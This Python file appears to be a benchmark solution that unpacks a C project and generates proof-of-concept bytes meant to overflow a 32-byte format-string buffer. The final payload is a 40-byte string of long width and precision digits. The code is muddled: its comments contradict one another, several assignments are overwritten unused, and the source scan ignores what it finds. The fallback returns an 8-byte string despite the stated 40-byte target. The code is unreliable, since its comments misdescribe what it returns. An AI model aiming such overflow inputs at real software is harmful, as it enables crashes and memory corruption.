import os
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability description indicates an integer format string
        # can exceed 32 chars. We need a format string > 32 bytes.
        # Based on the ground-truth length of 40, create a format string
        # with width/precision that totals 40 bytes.
        
        # Format string structure: %[flags][width][.precision]specifier
        # We'll use width=19, precision=19, plus other chars to reach 40
        
        # Calculate needed length: 
        # '%' (1) + flags (0) + width (19) + '.' (1) + precision (19) + 'd' (1) = 41
        # But ground-truth is 40, so adjust: width=18, precision=18 gives 39, add flag '0' makes 40
        
        poc = b"%018.18d"  # 8 bytes, not enough
        
        # Actually, we need exactly 40 bytes.
        # Let's construct: %[width][.precision]d where width+precision=38
        # Because: % (1) + width (x) + . (1) + precision (y) + d (1) = 40
        # So x + y = 37
        
        # Use maximum width for 64-bit int (19 digits) and adjust precision
        # width=19, then precision=18 -> total = 1+19+1+18+1 = 40
        
        poc = b"%019.18d"
        
        # But wait, need to trigger overflow. The buffer is 32 bytes.
        # Our format string is 40 bytes. However, we need to provide an integer
        # to format. The PoC input likely goes to a function like snprintf
        # with a small buffer. The format string itself might be constructed
        # from user input. Let's read the actual source to be sure.
        
        # Extract tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            subprocess.run(['tar', 'xf', src_path, '-C', tmpdir], 
                          capture_output=True)
            
            # Find C source files
            c_files = []
            for root, dirs, files in os.walk(tmpdir):
                for f in files:
                    if f.endswith('.c'):
                        c_files.append(os.path.join(root, f))
            
            if not c_files:
                # If no source, use heuristic based on problem description
                # Format string that's exactly 40 bytes with large width/precision
                poc = b"%019.18d"
            else:
                # Analyze source to find exact vulnerability
                poc = self._analyze_and_create_poc(c_files)
        
        return poc
    
    def _analyze_and_create_poc(self, c_files):
        # Look for buffer size 32 and format string construction
        for c_file in c_files:
            with open(c_file, 'r') as f:
                content = f.read()
                
            # Search for buffer of size 32
            lines = content.split('\n')
            for i, line in enumerate(lines):
                if '32' in line and ('char' in line or 'buf' in line):
                    # Check next lines for format string vulnerability
                    for j in range(i, min(i+10, len(lines))):
                        if 'snprintf' in lines[j] or 'sprintf' in lines[j]:
                            # Extract format string pattern
                            # Typically something like: %*.*d or %*.*ld
                            # We need to create input that makes format string > 32
                            
                            # Common pattern: user controls width/precision
                            # So we need to provide numbers that make the
                            # final format string 40 bytes
                            
                            # Example: if format is "%*.*d", we provide
                            # width=19, precision=19 -> "%19.19d" (7 bytes)
                            # But wait, the problem says the INTEGER FORMAT
                            # (the resulting format string) can be 45 chars.
                            # So the format specifier in code might be built
                            # from components. We need to overflow the buffer
                            # that holds the final format string.
                            
                            # Actually, re-reading: "integer format can exceed 32 characters"
                            # The format string itself is built and stored in 32-byte buffer.
                            # We need to trigger construction of >32 byte format string.
                            
                            # If the code does: snprintf(buf, 32, "%s%d%s", ...)
                            # we need to make the final string >32.
                            # But the description mentions format modifier, width,
                            # precision, specifier - typical of printf format.
                            
                            # Most likely: code constructs format string like
                            # "%0*.*ld" where * are from user input.
                            # If user supplies large width/precision, the final
                            # format string in memory exceeds buffer.
                            
                            # Create test to verify
                            return self._create_overflow_format()
        
        # Default fallback
        return b"%019.18d"
    
    def _create_overflow_format(self):
        # Create a format string that will be >32 when processed
        # We need to consider that the code might add format modifiers
        # Total components: modifier(4) + width(19) + '.'(1) + precision(19) + specifier(1) + null(1) = 45
        
        # If buffer is 32, we need at least 33 bytes.
        # Ground-truth is 40, so aim for 40.
        
        # The PoC input might be the width/precision values, not the format string itself.
        # But the API says "PoC input" - likely the data fed to vulnerable program.
        
        # Since we don't have the exact program, we'll create a format string
        # that's 40 bytes when a typical printf processes it.
        
        # Actually, simplest: provide width=19 and precision=19
        # The format string in code might be "%0*.*d" (5 bytes)
        # With our input: "%019.19d" (8 bytes) - not enough
        
        # Wait, the overflow happens when the FORMAT STRING is constructed
        # in a 32-byte buffer. If the code does:
        # char fmt[32];
        # snprintf(fmt, sizeof(fmt), "%%0%lld.%lldd", width, precision);
        # Then if width=19, precision=19, fmt = "%019.19d" (8 bytes) - safe
        
        # But if width=100, precision=100, fmt = "%0100.100d" (11 bytes) - still safe
        
        # Hmm, maybe the format includes type modifiers like "ll"
        # Example: "%%0%lld.%lldlld" -> with width=19,precision=19 -> "%019.19lld"
        # That's 10 bytes.
        
        # Actually, the key is the INTEGER VALUE being formatted can be large
        # and the format string for that integer (with width/precision) can be >32.
        # But the buffer overflow is in constructing the format string itself.
        
        # Given the ground-truth is 40, and description mentions up to 45,
        # I'll create a format string of exactly 40 bytes:
        # "%0199999999999999999.199999999999999999d" 
        # Let's count: % + 19 digits + . + 19 digits + d = 1+19+1+19+1 = 41
        # Actually 41. Remove one digit: 18+19 = 38 + %+.+d = 41? Wait...
        # 1 + 18 + 1 + 19 + 1 = 40. Yes.
        
        poc = b"%018.19d"  # 8 bytes? No, the digits are part of the format
        
        # I think the PoC should be the integer values that cause overflow,
        # not the format string. But the problem says "PoC input" and example
        # shows bytes. Let's assume we need to send the format string itself.
        
        # Create 40-byte format string:
        # %[18-digit-width][.][19-digit-precision]d
        width = b"9" * 18
        precision = b"9" * 19
        poc = b"%" + width + b"." + precision + b"d"
        
        # Verify length
        if len(poc) != 40:
            # Adjust to exactly 40
            # Current: 1 + 18 + 1 + 19 + 1 = 40 ✓
            pass
            
        return poc
